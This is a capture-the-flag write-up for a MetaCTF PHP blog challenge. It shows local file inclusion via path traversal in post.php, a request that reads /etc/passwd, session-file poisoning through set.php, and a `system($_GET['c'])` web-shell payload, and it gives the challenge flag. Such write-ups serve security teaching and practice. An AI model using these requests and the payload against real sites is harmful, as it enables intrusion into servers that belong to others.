# Custom Blog

## Description

> This guy wrote his own blog in PHP instead of, I dunno, literally anything else. Can you teach him a lesson?

{% file src="../../.gitbook/assets/source.zip" %}

## Solution

The first thing to notice is that in `/post.php`, there is a local file inclusion (LFI) vulnerability.

```php
<?php
  session_start();

  if (isset($_GET['post']) && file_exists($post = 'posts/' . $_GET['post'])) {
    $ok = true;
  } else {
    $ok = false;
    http_response_code(404);
  }

  ...
  
  if ($ok) {
    echo '<h1>' . htmlentities($_GET['post']) . '</h1><hr><div class="post">';
    include $post;
    echo '</div>';
  } else {
    echo '<h1>post not found :(</h1><hr>';
  }
  ...
?>
```

The `post` GET query parameter is used as the filename in the `include $post` statement. For instance, we could request `/post.php?post=../../../../../../etc/passwd`.

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 7.39.34 PM.png>)

But what we really want is remote code execution (RCE). How do we do that? We need to be able to write to a file stored on the server, then include that file through the above LFI vulnerability.

After doing some research, I found that PHP sessions are file-based by default, and the filenames are pretty predictable - each user's session file is stored at `/tmp/sess_<PHPSESSID>`.&#x20;

If we look at `/set.php`, we can see that we are able to set the `theme` value in the session to any arbitrary string through the `theme` GET query parameter.

```php
<?php
  session_start();

  if (isset($_GET['theme'])) {
    $_SESSION['theme'] = $_GET['theme'];
  }

  header('Location: /');
  die();
?>
```

The session file can then be accessed through the LFI vulnerability, and our input is reflected into the included PHP code! For example, if we set our `theme` to `<?php phpinfo() ?>`, we get the following output when including our session file.

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 7.52.03 PM.png>)

If we set the theme to the following PHP payload, we can get a web shell: `/set.php?theme=<?php system($_GET['c']) ?>`

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 7.53.46 PM.png>)

Explore the filesystem for a bit and you'll find the flag: `MetaCTF{wh4t??lfi_1s_ev0lv1ng??}`
